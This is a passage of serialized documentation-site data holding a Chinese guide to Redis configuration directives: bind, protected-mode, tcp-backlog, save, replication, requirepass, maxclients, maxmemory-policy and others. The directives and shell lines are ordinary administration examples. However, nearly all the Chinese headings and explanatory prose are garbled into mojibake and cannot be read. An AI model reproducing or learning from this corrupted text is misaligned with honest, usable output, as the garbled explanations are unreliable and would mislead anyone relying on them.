tcp-backlog",charIndex:321},{level:5,title:"æ¥çéåå¤§å°",slug:"æ¥çéåå¤§å°",normalizedTitle:"æ¥çéåå¤§å°",charIndex:846},{level:5,title:"ä¿®æ¹éåå¤§å°",slug:"ä¿®æ¹éåå¤§å°",normalizedTitle:"ä¿®æ¹éåå¤§å°",charIndex:970},{level:3,title:"timeout",slug:"timeout",normalizedTitle:"timeout",charIndex:1128},{level:3,title:"tcp-keepalive",slug:"tcp-keepalive",normalizedTitle:"tcp-keepalive",charIndex:1178},{level:2,title:"general ä¸è¬",slug:"general-ä¸è¬",normalizedTitle:"general ä¸è¬",charIndex:1282},{level:3,title:"daemonize",slug:"daemonize",normalizedTitle:"daemonize",charIndex:1297},{level:3,title:"supervised",slug:"supervised",normalizedTitle:"supervised",charIndex:1418},{level:3,title:"pidfile",slug:"pidfile",normalizedTitle:"pidfile",charIndex:1828},{level:3,title:"loglevel",slug:"loglevel",normalizedTitle:"loglevel",charIndex:1953},{level:3,title:"logfile",slug:"logfile",normalizedTitle:"logfile",charIndex:2135},{level:3,title:"databases",slug:"databases",normalizedTitle:"databases",charIndex:2238},{level:3,title:"always-show-logo",slug:"always-show-logo",normalizedTitle:"always-show-logo",charIndex:2358},{level:2,title:"snapshotting å¿«ç§",slug:"snapshotting-å¿«ç§",normalizedTitle:"snapshotting å¿«ç§",charIndex:2425},{level:3,title:"save",slug:"save",normalizedTitle:"save",charIndex:2445},{level:3,title:"stop-writes-on-bgsave-error",slug:"stop-writes-on-bgsave-error",normalizedTitle:"stop-writes-on-bgsave-error",charIndex:2619},{level:3,title:"rdbcompression",slug:"rdbcompression",normalizedTitle:"rdbcompression",charIndex:2812},{level:3,title:"rdbchecksum",slug:"rdbchecksum",normalizedTitle:"rdbchecksum",charIndex:2966},{level:3,title:"dbfilename",slug:"dbfilename",normalizedTitle:"dbfilename",charIndex:3089},{level:3,title:"rdb-del-sync-files",slug:"rdb-del-sync-files",normalizedTitle:"rdb-del-sync-files",charIndex:3143},{level:3,title:"åå»ºrdbæä»¶æºå¶",slug:"åå»ºrdbæä»¶æºå¶",normalizedTitle:"åå»º rdb æä»¶æºå¶",charIndex:3238},{level:2,title:"replication ä¸»ä»å¤å¶",slug:"replication-ä¸»ä»å¤å¶",normalizedTitle:"replication ä¸»ä»å¤å¶",charIndex:3889},{level:3,title:"replica-serve-stale-data",slug:"replica-serve-stale-data",normalizedTitle:"replica-serve-stale-data",charIndex:3910},{level:3,title:"replica-read-only",slug:"replica-read-only",normalizedTitle:"replica-read-only",charIndex:4183},{level:3,title:"repl-diskless-sync",slug:"repl-diskless-sync",normalizedTitle:"repl-diskless-sync",charIndex:4272},{level:3,title:"repl-diskless-sync-delay",slug:"repl-diskless-sync-delay",normalizedTitle:"repl-diskless-sync-delay",charIndex:4343},{level:3,title:"repl-diskless-load",slug:"repl-diskless-load",normalizedTitle:"repl-diskless-load",charIndex:4479},{level:3,title:"repl-disable-tcp-nodelay",slug:"repl-disable-tcp-nodelay",normalizedTitle:"repl-disable-tcp-nodelay",charIndex:4536},{level:3,title:"replica-priority",slug:"replica-priority",normalizedTitle:"replica-priority",charIndex:4690},{level:2,title:"- keys tracking é®è¿½è¸ª",slug:"keys-tracking-é®è¿½è¸ª",normalizedTitle:"- keys tracking é®è¿½è¸ª",charIndex:4857},{level:2,title:"security å®å¨",slug:"security-å®å¨",normalizedTitle:"security å®å¨",charIndex:4919},{level:3,title:"+ acllog-max-len",slug:"acllog-max-len",normalizedTitle:"+ acllog-max-len",charIndex:4935},{level:3,title:"- aclfile",slug:"aclfile",normalizedTitle:"- aclfile",charIndex:4981},{level:3,title:"- requirepass",slug:"requirepass",normalizedTitle:"- requirepass",charIndex:5030},{level:3,title:"- rename-command",slug:"rename-command",normalizedTitle:"- rename-command",charIndex:5075},{level:2,title:"clients å®¢æ·",slug:"clients-å®¢æ·",normalizedTitle:"clients å®¢æ·",charIndex:5127},{level:3,title:"maxclients",slug:"maxclients",normalizedTitle:"maxclients",charIndex:5142},{level:2,title:"memory management åå­ç®¡ç",slug:"memory-management-åå­ç®¡ç",normalizedTitle:"memory management åå­ç®¡ç",charIndex:5432},{level:3,title:"maxmemory",slug:"maxmemory",normalizedTitle:"maxmemory",charIndex:5459},{level:3,title:"maxmemory-policy",slug:"maxmemory-policy",normalizedTitle:"maxmemory-policy",charIndex:5548},{level:3,title:"maxmemory-samples",slug:"maxmemory-samples",normalizedTitle:"maxmemory-samples",charIndex:6117},{level:3,title:"replica-ignore-maxmemory",slug:"replica-ignore-maxmemory",normalizedTitle:"replica-ignore-maxmemory",charIndex:6352},{level:3,title:"active-expire-effort",slug:"active-expire-effort",normalizedTitle:"active-expire-effort",charIndex:6854},{level:2,title:"lazy freeing ææ°éæ¾",slug:"lazy-freeing-ææ°éæ¾",normalizedTitle:"lazy freeing ææ°éæ¾",charIndex:6908},{level:3,title:"lazyfree-lazy-eviction",slug:"lazyfree-lazy-eviction",normalizedTitle:"lazyfree-lazy-eviction",charIndex:6979},{level:3,title:"lazyfree-lazy-expire",slug:"lazyfree-lazy-expire",normalizedTitle:"lazyfree-lazy-expire",charIndex:7005},{level:3,title:"lazyfree-lazy-server-del",slug:"lazyfree-lazy-server-del",normalizedTitle:"lazyfree-lazy-server-del",charIndex:7029},{level:3,title:"slave-lazy-flush",slug:"slave-lazy-flush",normalizedTitle:"slave-lazy-flush",charIndex:7524},{level:3,title:"lazyfree-lazy-user-del",slug:"lazyfree-lazy-user-del",normalizedTitle:"lazyfree-lazy-user-del",charIndex:7687},{level:2,title:"threaded I/O çº¿ç¨",slug:"threaded-i-o-çº¿ç¨",normalizedTitle:"threaded i/o çº¿ç¨",charIndex:7816},{level:3,title:"io-threads-do-reads",slug:"io-threads-do-reads",normalizedTitle:"io-threads-do-reads",charIndex:8054},{level:2,title:"kernel oom control åæ ¸ oom æ§å¶",slug:"kernel-oom-control-åæ ¸-oom-æ§å¶",normalizedTitle:"kernel oom control åæ ¸ oom æ§å¶",charIndex:8312},{level:2,title:"append only mode AOF è¿½å æ¨¡å¼",slug:"append-only-mode-aof-è¿½å æ¨¡å¼",normalizedTitle:"append only mode aof è¿½å æ¨¡å¼",charIndex:8710},{level:3,title:"appendonly",slug:"appendonly",normalizedTitle:"appendonly",charIndex:8851},{level:3,title:"appendfilename",slug:"appendfilename",normalizedTitle:"appendfilename",charIndex:8896},{level:3,title:"appendfsync",slug:"appendfsync",normalizedTitle:"appendfsync",charIndex:8969},{level:3,title:"no-appendfsync-on-rewrite",slug:"no-appendfsync-on-rewrite",normalizedTitle:"no-appendfsync-on-rewrite",charIndex:9168},{level:3,title:"auto-aof-rewrite-percentage auto-aof-rewrite-min-size",slug:"auto-aof-rewrite-percentage-auto-aof-rewrite-min-size",normalizedTitle:"auto-aof-rewrite-percentage auto-aof-rewrite-min-size",charIndex:9603},{level:3,title:"auto-aof-rewrite-min-size",slug:"auto-aof-rewrite-min-size",normalizedTitle:"auto-aof-rewrite-min-size",charIndex:9631},{level:5,title:"rewriteæºå¶",slug:"rewriteæºå¶",normalizedTitle:"rewrite æºå¶",charIndex:10040},{level:3,title:"aof-load-truncated",slug:"aof-load-truncated",normalizedTitle:"aof-load-truncated",charIndex:10647},{level:3,title:"aof-use-rdb-preamble",slug:"aof-use-rdb-preamble",normalizedTitle:"aof-use-rdb-preamble",charIndex:10807},{level:2,title:"lua scripting lua èæ¬",slug:"lua-scripting-lua-èæ¬",normalizedTitle:"lua scripting lua èæ¬",charIndex:11082},{level:2,title:"- cluster éç¾¤",slug:"cluster-éç¾¤",normalizedTitle:"- cluster éç¾¤",charIndex:11491},{level:2,title:"slow logæ¢æ¥å¿",slug:"slow-logæ¢æ¥å¿",normalizedTitle:"slow log æ¢æ¥å¿",charIndex:12890},{level:2,title:"latency monitor å»¶è¿çè§å¨",slug:"latency-monitor-å»¶è¿çè§å¨",normalizedTitle:"latency monitor å»¶è¿çè§å¨",charIndex:13211},{level:2,title:"event notification äºä»¶éç¥",slug:"event-notification-äºä»¶éç¥",normalizedTitle:"event notification äºä»¶éç¥",charIndex:13446},{level:2,title:"advanced config é«çº§éç½®",slug:"advanced-config-é«çº§éç½®",normalizedTitle:"advanced config é«çº§éç½®",charIndex:13506}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"network ç½ç» + bind + protected-mode + port + tcp-backlog æ¥çéåå¤§å° ä¿®æ¹éåå¤§å° timeout tcp-keepalive general ä¸è¬ daemonize supervised pidfile loglevel logfile databases always-show-logo snapshotting å¿«ç§ save stop-writes-on-bgsave-error rdbcompression rdbchecksum dbfilename rdb-del-sync-files åå»ºrdbæä»¶æºå¶ replication ä¸»ä»å¤å¶ replica-serve-stale-data replica-read-only repl-diskless-sync repl-diskless-sync-delay repl-diskless-load repl-disable-tcp-nodelay replica-priority - keys tracking é®è¿½è¸ª security å®å¨ + acllog-max-len - aclfile - requirepass - rename-command clients å®¢æ· maxclients memory management åå­ç®¡ç maxmemory maxmemory-policy maxmemory-samples replica-ignore-maxmemory active-expire-effort lazy freeing ææ°éæ¾ lazyfree-lazy-eviction lazyfree-lazy-expire lazyfree-lazy-server-del slave-lazy-flush lazyfree-lazy-user-del threaded I/O çº¿ç¨ io-threads-do-reads kernel oom control åæ ¸ oom æ§å¶ append only mode AOF è¿½å æ¨¡å¼ appendonly appendfilename appendfsync no-appendfsync-on-rewrite auto-aof-rewrite-percentage auto-aof-rewrite-min-size auto-aof-rewrite-min-size rewriteæºå¶ aof-load-truncated aof-use-rdb-preamble lua scripting lua èæ¬ - cluster éç¾¤ slow logæ¢æ¥å¿ latency monitor å»¶è¿çè§å¨ event notification äºä»¶éç¥ advanced config é«çº§éç½®",content:'> + é»è®¤éç½®æå¼ï¼- é»è®¤éç½®å³é­\n\n\n# network ç½ç»\n\n\n# + bind\n\n# ç»å®IP\nbind 127.0.0.1\n\n\n1\n2\n\n\né»è®¤æ¯ 127.0.0.1ï¼ä¿®æ¹ç IP å¦æä¸ä¸ºæ¬æº IP æ¯æ æ³å¯å¨çãå¯ä»¥ç´æ¥æ³¨é bindï¼è¿æ ·æææºå¨å¯è¿ï¼ä½ä¼å protected-mode åæ°å½±åã\n\n\n# + protected-mode\n\n# åä¿æ¤ç é»è®¤å¼å¯\nprotected-mode yes\n\n\n1\n2\n\n\nä¿æ¤æ¨¡å¼ä¸ï¼æ è®º bind æ¯å¦è¢«æ³¨éé½æ æ³è¿ç¨è®¿é®ãæ³åè®¸å¤ç½æå±åç½è®¿é®éè¦å³é­ä¿æ¤æ¨¡å¼ï¼ä¸æ³¨é bindã\n\n\n# + port\n\n### ç«¯å£é»è®¤\nport 6379\n\n\n1\n2\n\n\n\n# + tcp-backlog\n\ntcp-backlog 511\n\n\n1\n\n\nLinux åæ ¸ä¸ºæ¯ä¸ª TCP æå¡å¨ç¨åºç»´æ¤ä¸¤æ¡ backlog éåï¼ä¸æ¡æ¯ TCP å±çæªè¿æ¥éåï¼ä¸æ¡æ¯åºç¨å±çå·²è¿æ¥éåï¼åå«å¯¹åº net.ipv4.tcp_max_syn_backlog å net.core.somaxconn ä¸¤ä¸ªåæ ¸åæ°ã\n\nä¸ä¸ªå®¢æ·ç«¯è¿æ¥å¨å®æ TCP 3 æ¬¡æ¡æä¹åé¦åè¿å¥å°æªè¿æ¥éåï¼å®ææ¡æä¹åæ­£å¼å»ºç«è¿æ¥ï¼è¿å¥å·²è¿æ¥éåï¼äº¤ä»ç»åºç¨ç¨åºå¤çãåºç¨ç¨åºè°ç¨ accept () å½æ°ä»å·²è¿æ¥éåååºè¿æ¥è¿è¡å¤çãåºç¨å±å¨è°ç¨ listen () å½æ°æ¶æå®ç backlog æ¯å·²è¿æ¥éåå¤§å°ï¼å¦æå¤§äº somaxconn å°è¢«è®¾ä¸º somaxconnã\n\nå¦æåºç¨å±ä¸è°ç¨ accept () å½æ°å¤çä¸ä¸ªè¿æ¥ï¼æèå¤çä¸åæ¶çè¯ï¼å°ä¼å¯¼è´å·²è¿æ¥éåå æ»¡ãå·²è¿æ¥éåå·²æ»¡çè¯ä¼å¯¼è´æªè¿æ¥éåå¨å¤çå® 3 æ¬¡æ¡æä¹åæ æ³è¿å¥å·²è¿æ¥éåï¼æç»ä¹å¯¼è´æªè¿æ¥éåå æ»¡ï¼å¨æå¡å¨çå°å¤äºæªè¿æ¥éåä¸­çè¿æ¥ç¶æä¸º SYN_RECVã æ°è¿æ¥çå®¢æ·ç«¯è¿æ¥å°ä¼ä¸ç´å¤äº SYN_SENT ç¶æç­å¾æå¡å¨ç ACK åºç­ï¼æç»å¯¼è´è¿æ¥è¶æ¶ã\n\n# æ¥çéåå¤§å°\n\næ¥çæªè¿æ¥éåé»è®¤å¼ï¼\n\ncat /proc/sys/net/ipv4/tcp_max_syn_backlog\n\n\n1\n\n\næ¥çå·²è¿æ¥éåé»è®¤å¼ï¼\n\ncat /proc/sys/net/core/somaxconn\n\n\n1\n\n\n# ä¿®æ¹éåå¤§å°\n\nå¯ä»¥ç´æ¥æ¹åè¿ä¸¤ä¸ªæä»¶çå¼ãè¦æ°¸ä¹ä¿®æ¹è¿ä¸¤ä¸ªåæ ¸åæ°çè¯å¯ä»¥åå° /etc/sysctl.conf\n\nnet.ipv4.tcp_max_syn_backlog = 1024\nnet.core.somaxconn = 1024\n\n\n1\n2\n\n\næ¹å®åæ§è¡ sysctl -p è®©ä¿®æ¹ç«å³çæã\n\n\n# timeout\n\ntimeout 0\n\n\n1\n\n\nå®¢æ·ç«¯é²ç½® N ç§åå³é­è¿æ¥ï¼0 ç¦ç¨ï¼\n\n\n# tcp-keepalive\n\ntcp-keepalive 300\n\n\n1\n\n\nåå®¢æ·ç«¯åé TCP ACK æ£æµè¿æ¥æ¯å¦æ­å¼ï¼ä¿è¯è¿æ¥æ´»è·ãåä½ç§ï¼é»è®¤ 300 ç§åéä¸æ¬¡ï¼å¦æç­äº 0 å°±æ¯ç¦ç¨ã\n\n\n# general ä¸è¬\n\n\n# daemonize\n\ndaemonize no\n\n\n1\n\n\né»è®¤æåµä¸ï¼Redis ä¸ä¼ä½ä¸ºå®æ¤ç¨åºè¿è¡ãå¦æéè¦ï¼è¯·è®¾ç½®ä¸º yesãè¯·æ³¨æï¼Redis å®æ¤è¿ç¨å°å¨ /var/run/redis.pid ä¸­åå¥ä¸ä¸ª pid æä»¶ã\n\n\n# supervised\n\nsupervised no\n\n\n1\n\n\nå¦æéè¦å¨æºå¨å¯å¨ï¼upstart æ¨¡å¼ æ systemd æ¨¡å¼ï¼æ¶å°±å¯å¨ Redis æå¡å¨ï¼å¯ä»¥éè¿è¯¥éé¡¹æ¥éç½® Redisã\n\n * supervised no - ä¸ä¼ä¸ supervised tree è¿è¡äº¤äº\n * supervised upstart - å° Redis æå¡å¨æ·»å å° SIGSTOP æ¨¡å¼ä¸­\n * supervised systemd - å° READY=1 åå¥ $NOTIFY_SOCKET\n * supervised auto - æ ¹æ®ç¯å¢åé UPSTART_JOB æ NOTIFY_SOCKET æ£æµ upstart è¿æ¯ systemd\n\nä¸è¿° supervision æ¹æ³ï¼upstart æ systemdï¼ä»ååº âç¨åºå·²å°±ç»ªâ ä¿¡å·ï¼ä¸ä¼ç»§ç»­ç» supervisor è¿å ping åå¤ã\n\n\n# pidfile\n\npidfile /var/run/redis_6379.pid\n\n\n1\n\n\nå½ Redis æå¡å¨å·²å®æ¤è¿ç¨å¯å¨æ¶ï¼å¦ææå®äºéç½®æä»¶ï¼åç´æ¥ä½¿ç¨ï¼å¦ææ²¡ææå®ï¼ååå»º /var/run/redis.pid ä½ä¸ºéç½®æä»¶ã\n\n\n# loglevel\n\nloglevel notice\n\n\n1\n\n\næå®æå¡å¨ç verbosity çº§å«ãRedis æä¾åç§çº§å«ï¼\n\n * debug åå«å¤§éä¿¡æ¯ï¼ç¨äºå¼ååæµè¯\n * verbose åå«ä¸äºç¨æçæç¨ä¿¡æ¯ï¼ä½æ²¡æ debug çº§å«æ··ä¹±\n * notice ééæç¤ºä¿¡æ¯ï¼ç¨äºçäº§ç¯å¢\n * warning åªåå«éå¸¸éè¦åå³é®çä¿¡æ¯\n\n\n# logfile\n\nlogfile ""\n\n\n1\n\n\næå®æ¥å¿æä»¶åç§°ãæå®ä¸ºç©ºæ¶å°è¾åºå°æ åè¾åºè®¾å¤ä¸­ãå¦æ Redis ä»¥å®æ¤è¿ç¨å¯å¨ï¼å½æ¥å¿æä»¶åç§°ä¸ºç©ºæ¶ï¼æ¥å¿å°ä¼è¾åºå° /dev/nullã\n\n\n# databases\n\ndatabases 16\n\n\n1\n\n\nè®¾ç½®æ°æ®åºçæ°éãé»è®¤ä½¿ç¨ 0 å·æ°æ®åºãå¯ä»¥å¨æ¯ä¸ä¸ªè¿æ¥ä¸ä½¿ç¨ SELECT <dbid> æ¥æå®å¦å¤çæ°æ®åºï¼ä½æ¯è¿ä¸ªå¼å¿é¡»å¨ 0 å° database -1 ä¹é´ã\n\n\n# always-show-logo\n\nalways-show-logo yes\n\n\n1\n\n\nredis å¯å¨çæ¶åæ¾ç¤º æ¥å¿ã\n\n\n# snapshotting å¿«ç§\n\n\n# save\n\nsave 900 1\nsave 300 10\nsave 60 10000\n\n\n1\n2\n3\n\n\nè¿äº 900 ç§å¹¶ä¸æ 1 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\nè¿äº 300 ç§å¹¶ä¸æ 10 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\nè¿äº 60 ç§å¹¶ä¸è³å°æ 10000 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\n\n\n# stop-writes-on-bgsave-error\n\nstop-writes-on-bgsave-error yes\n\n\n1\n\n\né»è®¤å¼ä¸º yesãå½å¯ç¨äº RDB ä¸æåä¸æ¬¡åå°ä¿å­æ°æ®å¤±è´¥ï¼Redis æ¯å¦åæ­¢æ¥æ¶æ°æ®ãè¿ä¼è®©ç¨æ·æè¯å°æ°æ®æ²¡ææ­£ç¡®æä¹åå°ç£çä¸ï¼å¦åæ²¡æäººä¼æ³¨æå°ç¾é¾ï¼disasterï¼åçäºãå¦æ Redis éå¯äºï¼é£ä¹åå¯ä»¥éæ°å¼å§æ¥æ¶æ°æ®äº\n\n\n# rdbcompression\n\nrdbcompression yes\n\n\n1\n\n\né»è®¤å¼æ¯ yesãå¯¹äºå­å¨å°ç£çä¸­çå¿«ç§ï¼å¯ä»¥è®¾ç½®æ¯å¦è¿è¡åç¼©å­å¨ãå¦ææ¯çè¯ï¼redis ä¼éç¨ LZF ç®æ³è¿è¡åç¼©ãå¦æä½ ä¸æ³æ¶è CPU æ¥è¿è¡åç¼©çè¯ï¼å¯ä»¥è®¾ç½®ä¸ºå³é­æ­¤åè½ï¼ä½æ¯å­å¨å¨ç£çä¸çå¿«ç§ä¼æ¯è¾å¤§ã\n\n\n# rdbchecksum\n\nrdbchecksum yes\n\n\n1\n\n\nå¨å­å¨å¿«ç§åï¼æä»¬è¿å¯ä»¥è®© redis ä½¿ç¨ CRC64 ç®æ³æ¥è¿è¡æ°æ®æ ¡éªï¼ä½æ¯è¿æ ·åä¼å¢å å¤§çº¦ 10% çæ§è½æ¶èï¼å¦æå¸æè·åå°æå¤§çæ§è½æåï¼å¯ä»¥å³é­æ­¤åè½ã\n\n\n# dbfilename\n\ndbfilename dump.rdb\n\n\n1\n\n\nrdb æä»¶å¾æä»¶åç§°\n\n\n# rdb-del-sync-files\n\nrdb-del-sync-files no\n\n\n1\n\n\nrdb æä»¶æ¯å¦å é¤åæ­¥é\n\ndir ./\n\n\n1\n\n\nè®¾ç½® rdb æä»¶å­æ¾å¾è·¯å¾\n\n\n# åå»º rdb æä»¶æºå¶\n\nfork åºä¸ä¸ªå­è¿ç¨æ¥å¤çï¼å®åç¶è¿ç¨å±äº«åå­éé¢çä»£ç æ®µåæ°æ®æ®µãè¿æ¶ä½ å¯ä»¥æç¶å­è¿ç¨æ³è±¡æä¸ä¸ªè¿ä½å©´å¿ï¼ä»ä»¬å¨å±äº«èº«ä½ãè¿å°±æ¯ Linux æä½ç³»ç»çæºå¶ï¼ä¸ºäºèçº¦åå­èµæºï¼æä»¥å°½å¯è½è®©ä»ä»¬å±äº«èµ·æ¥ãå¨è¿ç¨åç¦»çä¸ç¬é´ï¼åå­çå¢é¿å ä¹æ²¡æææ¾ååã\n\nå­è¿ç¨åæ°æ®æä¹åï¼ä¸ä¼ä¿®æ¹ç°æçåå­æ°æ®ç»æï¼å®åªæ¯å¯¹æ°æ®ç»æè¿è¡éåè¯»åï¼ç¶ååºååå°ç£çä¸­ãä½æ¯ç¶è¿ç¨ä¸ä¸æ ·ï¼å®å¿é¡»æç»­æå¡å®¢æ·è¯·æ±ï¼ç¶åå åå­æ°æ®ç»æè¿è¡ä¸é´æ­çä¿®æ¹ã\n\nè¿ä¸ªæ¶åå°±ä¼ä½¿ç¨æä½ç³»ç»ç COW (copy on write) æºå¶æ¥è¿è¡æ°æ®æ®µé¡µé¢çåç¦»ãæ°æ®æ®µæ¯ç±å¾å¤æä½ç³»ç»çé¡µé¢ç»åèæï¼å½ç¶è¿ç¨å¯¹å¶ä¸­ä¸ä¸ªé¡µé¢çæ°æ®è¿è¡ä¿®æ¹æ¶ï¼ä¼å°è¢«å±äº«çé¡µé¢å¤å¶ä¸ä»½åç¦»åºæ¥ï¼ç¶åå¯¹è¿ä¸ªå¤å¶çé¡µé¢è¿è¡ä¿®æ¹ãè¿æ¶å­è¿ç¨ç¸åºçé¡µé¢æ¯æ²¡æååçï¼è¿æ¯è¿ç¨äº§çé£ä¸ç¬é´çæ°æ®ã\n\néçç¶è¿ç¨ä¿®æ¹æä½çæç»­è¿è¡ï¼è¶æ¥è¶å¤çå±äº«é¡µé¢è¢«åç¦»åºæ¥ï¼åå­å°±ä¼æç»­å¢é¿ï¼ä½æ¯ä¹ä¸ä¼è¶è¿åææ°æ®åå­ç 2 åå¤§å°ãå¦å¤ï¼Redis å®ä¾éå·æ°æ®å çæ¯ä¾å¾å¾æ¯æ¯è¾é«çï¼æä»¥å¾å°ä¼åºç°ææçé¡µé¢é½è¢«åç¦»çæåµï¼è¢«åç¦»çå¾å¾åªæå¶ä¸­ä¸é¨åé¡µé¢ãæ¯ä¸ªé¡µé¢çå¤§å°åªæ 4KBï¼ä¸ä¸ª Redis å®ä¾éé¢ä¸è¬é½ä¼ææåä¸ä¸ä¸ªé¡µé¢ã\n\nå­è¿ç¨å ä¸ºæ°æ®æ²¡æååï¼å®è½çå°åå­éçæ°æ®å¨è¿ç¨äº§ççä¸ç¬é´å°±ååºäºï¼åä¹ä¸ä¼æ¹åï¼è¿ä¹æ¶ä¸ºä»ä¹ redis çæä¹åå« å¿«ç§ çåå ãæ¥ä¸æ¥å­è¿ç¨å°±å¯ä»¥éå¸¸å®å¿å°ä¾¿å©æ°æ®ï¼è¿è¡åºååç£çäºã\n\n\n# replication ä¸»ä»å¤å¶\n\n\n# replica-serve-stale-data\n\nreplica-serve-stale-data yes\n\n\n1\n\n\nå½ä¸ä¸ª slave ä¸ master å¤±å»èç³»æ¶ï¼æèå¤å¶æ­£å¨è¿è¡çæ¶åï¼slave åºå¯¹è¯·æ±çè¡ä¸º:\n\n * å¦æä¸º yesï¼é»è®¤å¼ï¼ï¼slave ä»ç¶ä¼åºç­å®¢æ·ç«¯è¯·æ±ï¼ä½è¿åçæ°æ®å¯è½æ¯è¿æ¶ï¼æèæ°æ®å¯è½æ¯ç©ºçå¨ç¬¬ä¸æ¬¡åæ­¥çæ¶å\n * å¦æä¸º no ï¼å¨ä½ æ§è¡é¤äº info å salveof ä¹å¤çå¶ä»å½ä»¤æ¶ï¼slave é½å°è¿åä¸ä¸ª "SYNC with master in progress" çéè¯¯ã\n\n\n# replica-read-only\n\nreplica-read-only yes\n\n\n1\n\n\nè®¾ç½® slave æ¯å¦æ¯åªè¯»çãä» 2.6 çèµ·ï¼slave é»è®¤æ¯åªè¯»ç\n\n\n# repl-diskless-sync\n\nrepl-diskless-sync no\n\n\n1\n\n\nä¸»ä»æ°æ®å¤å¶æ¯å¦ä½¿ç¨æ ç¡¬çå¤å¶åè½ã\n\n\n# repl-diskless-sync-delay\n\nrepl-diskless-sync-delay 5\n\n\n1\n\n\næ ç£ç (diskless) æ¹å¼å¨è¿è¡æ°æ®ä¼ éä¹åä¼æä¸ä¸ªæ¶é´çå»¶è¿ï¼ä»¥ä¾¿ slave ç«¯è½å¤è¿è¡å°å¾ä¼ éçç®æ éåä¸­ï¼è¿ä¸ªæ¶é´é»è®¤æ¯ 5 ç§\n\n\n# repl-diskless-load\n\nrepl-diskless-load disabled\n\n\n1\n\n\n\n# repl-disable-tcp-nodelay\n\nrepl-disable-tcp-nodelay no\n\n\n1\n\n\næ¯å¦å¯ç¨ TCP_NODELAYï¼å¦æå¯ç¨åä¼ä½¿ç¨å°éç TCP ååå¸¦å®½å»è¿è¡æ°æ®ä¼ è¾å° slave ç«¯ï¼å½ç¶éåº¦ä¼æ¯è¾æ¢ï¼å¦æä¸å¯ç¨åä¼ è¾éåº¦æ¯è¾å¿«ï¼ä½æ¯ä¼å ç¨æ¯è¾å¤çå¸¦å®½ã\n\n\n# replica-priority\n\nreplica-priority 100\n\n\n1\n\n\nå½ master ä¸è½æ­£å¸¸å·¥ä½çæ¶åï¼Redis Sentinel ä¼ä» slaves ä¸­éåºä¸ä¸ªæ°ç masterï¼è¿ä¸ªå¼è¶å°ï¼å°±è¶ä¼è¢«ä¼åéä¸­ï¼ä½æ¯å¦ææ¯ 0 ï¼ é£æ¯æå³çè¿ä¸ª slave ä¸å¯è½è¢«éä¸­ã é»è®¤ä¼åçº§ä¸º 100ã\n\n\n# - keys tracking é®è¿½è¸ª\n\ntracking-table-max-keys 1000000\n\n\n1\n\n\n\n# security å®å¨\n\n\n# + acllog-max-len\n\nacllog-max-len 128\n\n\n1\n\n\n\n# - aclfile\n\naclfile /etc/redis/users.acl\n\n\n1\n\n\n\n# - requirepass\n\nrequirepass foobared\n\n\n1\n\n\n\n# - rename-command\n\nrename-command CONFIG ""\n\n\n1\n\n\n\n# clients å®¢æ·\n\n\n# maxclients\n\nmaxclients 10000\n\n\n1\n\n\nè®¾ç½®æå¤§è¿æ¥å®¢æ·ç«¯æ°ãé»è®¤æåµä¸ï¼æ­¤éå¶è®¾ç½®ä¸º 10000 ä¸ªå®¢æ·ç«¯ï¼ä½æ¯ï¼å¦æ Redis æå¡å¨æ æ³å°è¿ç¨æä»¶éå¶éç½®ä¸ºåè®¸æå®çéå¶ï¼ååè®¸çæå¤§å®¢æ·ç«¯æ°å°è®¾ç½®ä¸ºå½åæä»¶éå¶åå» 32ï¼å ä¸º Redis ä¿çäºåé¨ä½¿ç¨çæä»¶æè¿°ç¬¦å¾å°ï¼\n\nè¾¾å°éå¶åï¼Redis å°å³é­æææ°è¿æ¥ï¼å¹¶åééè¯¯æ¶æ¯ âå·²è¾¾å°æå¤§å®¢æ·ç«¯æ°ã\n\nå½ä½¿ç¨ Redis Cluster æ¶ï¼æå¤§è¿æ¥æ°ä¹ä¼ä¸éç¾¤æ»çº¿å±äº«ï¼éç¾¤ä¸­çæ¯ä¸ªèç¹å°ä½¿ç¨ä¸¤ä¸ªè¿æ¥ï¼ä¸ä¸ªè¿å¥ï¼å¦ä¸ä¸ªåå¤ãå¯¹äºéå¸¸å¤§çéç¾¤ï¼éè¦çæ¯ç¸åºå°è°æ´éå¶å¤§å°ã\n\n\n# memory management åå­ç®¡ç\n\n\n# maxmemory\n\nmaxmemory <bytes>\n\n\n1\n\n\nå°åå­ä½¿ç¨éå¶è®¾ç½®ä¸ºæå®çå­èæ°ãå½è¾¾å°åå­éå¶æ¶ï¼Redis å°å°è¯æ ¹æ®æéçç­ç¥æ¥å é¤ keyï¼è¯·åè§ maxmemory-policyï¼ã\n\nå¦æ Redis æ æ³æ ¹æ®è¯¥ç­ç¥å é¤ keyï¼æèå¦æè¯¥ç­ç¥è®¾ç½®ä¸º \'noeviction\'ï¼å Redis å°å¼å§å¯¹å°ä½¿ç¨æ´å¤åå­çå½ä»¤ï¼ä¾å¦ SETï¼LPUSH ç­ï¼è¿è¡éè¯¯ç­å¤ï¼å¹¶å°ç»§ç»­ç­å¤è¯¸å¦ GET ä¹ç±»çåªè¯»å½ä»¤ã(ä¸æ¯æåï¼åªæ¯æè¯»)\n\nå¦ææ¯ä¸»ä»å¤å¶ï¼å»ºè®®æ¨ä¸º maxmemory è®¾ç½®ä¸ä¸ªä¸éï¼ä»¥ä¾¿ç³»ç»ä¸æä¸äºå¯ç¨åå­ç¨äº âä»â è¾åºç¼å²åºï¼ä½æ¯å¦æç­ç¥ä¸º \'noeviction\'ï¼åä¸éè¦è¿æ ·åï¼ã\n\n\n# maxmemory-policy\n\nmaxmemory-policy noeviction\n\n\n1\n\n\nmaxmemory ç­ç¥ï¼è¾¾å° maxmemory æ¶ï¼Redis å°å¦ä½éæ©è¦å é¤çåå®¹ãæ¨å¯ä»¥ä»ä»¥ä¸è¡ä¸ºä¸­éæ©ä¸ç§ï¼\n\n * volatile-lruï¼å©ç¨ LRU ç®æ³ç§»é¤è¿æ keysã\n * allkeys-lruï¼å©ç¨ LRU ç®æ³ç§»é¤ keysã\n * volatile-randomï¼éæºç§»é¤è¿æ keysã\n * allkeys-randomï¼éæºç§»é¤ keysã\n * volatile-ttlï¼æç§æè¿è¿ææ¶é´æ¥å é¤ï¼è¾ä»¥ TTLï¼ï¼ç§»é¤å³å°è¿æç keysã\n * noevictionï¼ä¸ç§»é¤ä»»ä½ keyï¼åªæ¯è¿åä¸ä¸ªåéè¯¯ã\n\n\n# maxmemory-samples\n\nmaxmemory-samples 